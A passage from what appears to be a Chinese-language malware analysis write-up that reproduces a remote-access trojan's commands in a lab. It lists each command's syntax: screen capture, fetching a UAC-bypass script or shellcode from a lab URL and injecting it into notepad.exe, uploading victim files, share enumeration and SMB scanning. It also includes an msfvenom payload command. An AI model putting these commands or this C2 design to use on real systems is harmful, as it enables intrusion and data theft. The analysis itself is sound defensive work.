![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCnML4ShdfGajSibryVfdIDG6pqNqEI1jdFrRbXhNqrSERhzQbpyHm42w/640?wx_fmt=png&from=appmsg "")  
  
相关代码截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCRv0hiciajp3Hlaiat79u5owPk1mwNiaaHfiaWTjsUXDF4ua6p7ibeTUGiaaUQ/640?wx_fmt=png&from=appmsg "")  
### s?p????????t  
  
通过分析，发现s?p????????t远控指令功能为截屏，梳理s?p????????t远控指令的命令格式如下：  
```
s?p????????t

```  
  
远控功能复现情况如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCnlciaL0KOZVbYX0DlxuoypSYTaRKxfSMpDVE52yhKHgS9Hv75aibg1gg/640?wx_fmt=png&from=appmsg "")  
  
相关解密后通信数据包截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCndbbFwmDoQuW0y7icMX0ricw8gHO4Nq8ia19yWNibeCfbGOMMbwjKFhiatw/640?wx_fmt=png&from=appmsg "")  
  
相关代码截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUC7o2sicY2waYYO2EbcfmBp07Qev8n3icOIdfe0qDtvIIKYGibywDOI0HNw/640?wx_fmt=png&from=appmsg "")  
### undhpass  
  
通过分析，发现undhpass远控指令功能为外链下载Bypass-UAC脚本用于绕过UAC，梳理undhpass远控指令的命令格式如下：  
```
undhpass|https://192.168.153.1/powershell.ps1

```  
  
远控功能复现情况如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCFgQpAwE8BbGn71t5SA8tY7aHxyoj3AHhcQB4dOJCRJYpUfibYRiccJDg/640?wx_fmt=png&from=appmsg "")  
  
相关解密后通信数据包截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUC0PEJLZft8xG5QXiaMviaJEgMia8aC0sj1yrxt5rMmo5m7aqqzLOeJ0rgg/640?wx_fmt=png&from=appmsg "")  
  
相关代码截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCrG5icOYBDRY9mxSibsclicHwj6wgeQOXJDVic5D2UKoiaMnRVcEuoOLQRsQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCZMYYHUQSI4G3rU9VLib5pib1U3szXaR2sJmOVIh6p8IsnMEGnzcNeK7w/640?wx_fmt=png&from=appmsg "")  
### ddmwbvctslqd  
  
通过分析，发现ddmwbvctslqd远控指令功能为上传被控主机中的指定文件，梳理ddmwbvctslqd远控指令的命令格式如下：  
```
ddmwbvctslqd|C:\Users\admin\Desktop\1.txt

```  
  
远控功能复现情况如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCDrcHLxrxkydPTAt2icDgzzxwmxIxl4jsRzNOicibP7UiatOdE5mAEPkhicQ/640?wx_fmt=png&from=appmsg "")  
  
相关解密后通信数据包截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCH4Dcf7mnnibgxkGgH2odZrz7dGvRgic9vYczo2oasueG47663Kt1tnmg/640?wx_fmt=png&from=appmsg "")  
  
相关代码截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCq7RibnRbjnbwtibzsWyyfevNnWiaVH68Jn1YLGp1qWPqkPfyia7hVWgRfw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCxPzIXm3PTmsRQZpgtSxJN01DAleS2HPMwYgXvzQdSS0w2fDnq2Qpcg/640?wx_fmt=png&from=appmsg "")  
### pindhdgenfhj  
  
通过分析，发现pindhdgenfhj远控指令功能为从指定url下载shellcode并注入notepad.exe，梳理pindhdgenfhj远控指令的命令格式如下：  
```
pindhdgenfhj|https://192.168.65.1/shellcode|apcmjudk

```  
  
为了能够完整复现shellcode注入过程，笔者使用msf生成shellcode载荷，并通过远控指令注入至notepad.exe进程中，注入成功后，shellcode将反弹cmd至msf中。  
  
远控功能复现情况如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCicKQJiauIKCC1Cx0nAkSc4gKdLYIGuNicyVia2C3HbwB5WY03B8WiaVgFgQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCQxrbZk50hmQ6hhPkAX5JpkAadTHc2gxKeexkef7SWZBy7Jlawiahhnw/640?wx_fmt=png&from=appmsg "")  
  
相关解密后通信数据包截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUC0akEaEBI9mpicwKmicdT8icD9xC8WHYcNkpEupFJZwNibOtOiclmQu0xFeA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCSz7L2XJEDfQKGSbH3aWA95QyGLXK7bMicvooXLP5HRhZVvHibmuuGn0g/640?wx_fmt=png&from=appmsg "")  
  
相关代码截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCetayuJLf5hARaiaqImsxeOJF0bmgicbYtyoicIaGuKvZMIEI9WY2Dj0cA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCBdcm6ibgpwYZzYo9zBUsVO7JmUvzcDcmBlFH1pG3U0Z4b21w8Q15tQQ/640?wx_fmt=png&from=appmsg "")  
### shpjduhjenume  
  
通过分析，发现shpjduhjenume远控指令功能为利用WMI获取Win32_Share类（Windows 操作系统上的共享资源信息）信息：共享文件夹等。  
  
梳理shpjduhjenume远控指令的命令格式如下：  
```
shpjduhjenume

```  
  
远控功能复现情况如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCOsOib8gB6vJHyKg6IG4JYb6CY2NEMfbNHaDNLyAY1snXD8p0V2FVVNQ/640?wx_fmt=png&from=appmsg "")  
  
相关解密后通信数据包截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCRq2ZPflYYD5ibwhp0vdsFmomvTITX91AQWB2wU2R5Qicm6DoWClJZOLA/640?wx_fmt=png&from=appmsg "")  
  
相关代码截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUC88LVqEXSoicPtzO8W1jbuGGYia5W3dodgcsCoNsKZK05ZfRZhXeR0ezA/640?wx_fmt=png&from=appmsg "")  
### midhenhhmidfds  
  
通过分析，发现midhenhhmidfds远控指令功能为使用shellcode执行指定功能，执行逻辑如下：  
- 外链下载shellcode并通过QueueUserAPC注入notepad.exe执行；  
  
- 休眠10秒；  
  
- 执行结果将存放于C:\Windows\Tasks\BackgroundUsingMIMI.tmp文件中；  
  
- 返回BackgroundUsingMIMI.tmp文件内容；  
  
- 删除BackgroundUsingMIMI.tmp文件；  
  
梳理midhenhhmidfds远控指令的命令格式如下：  
```
midhenhhmidfds|https://192.168.65.1/shellcode

```  
  
为了能够完整复现shellcode功能，笔者使用msf生成可执行任意命令的shellcode载荷，msf命令如下：  
```
msfvenom -p windows/x64/exec CMD="cmd.exe /c echo 'Hello, World' > C:\Windows\Tasks\BackgroundUsingMIMI.tmp" -f hex

```  
  
远控功能复现情况如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUC6xAYzHyibzQReOKkZPIsMpxLZzIXchs2e9N3Niciajh1u6WOZrRmgMFBA/640?wx_fmt=png&from=appmsg "")  
  
相关解密后通信数据包截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCk12xCOSNpA2Oiagsa2BFLNIQhFGEJPKTpctGJ2q44bZhzEhWcNeOKHw/640?wx_fmt=png&from=appmsg "")  
  
相关代码截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCSQ0rK55Pr2rqTlbIkmL5tAXtpXmlWKXjVoy45ztugB32jutllH9pqQ/640?wx_fmt=png&from=appmsg "")  
### semnbhdndfenum  
  
通过分析，发现semnbhdndfenum远控指令功能为SMB端口扫描。  
  
梳理semnbhdndfenum远控指令的命令格式如下：  
```
semnbhdndfenum|192.168.65.1/24|445

```  
  
远控功能复现情况如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCIApkQVlsmOxvv7AlG1QrXxeTWEEIzL12jNnWZz13rEYXMnmjYdZyiaw/640?wx_fmt=png&from=appmsg "")  
  
相关解密后通信数据包截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCVGmyxp3lG7erRMb42yAWQiavia1Q7NUOHxbA8Inq0FcicVibNPHLKW5lSg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCtKiccJ7t13WcEoeIXdVSN0pPia1mP5cA6169yeLdkhcg7k8CrZ5Fe3VQ/640?wx_fmt=png&from=appmsg "")  
  
相关代码截图如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/4FZ1BxQicQ9wWD4YiaHcB26h8ZhFiaYFwUCkHias04YXTUnWM3ZzMUTXIMvLiczs8pcbZjaGsMVmTSNpofpG90icibUiag/640?wx_fmt=png&from=appmsg "")  
  
  
  
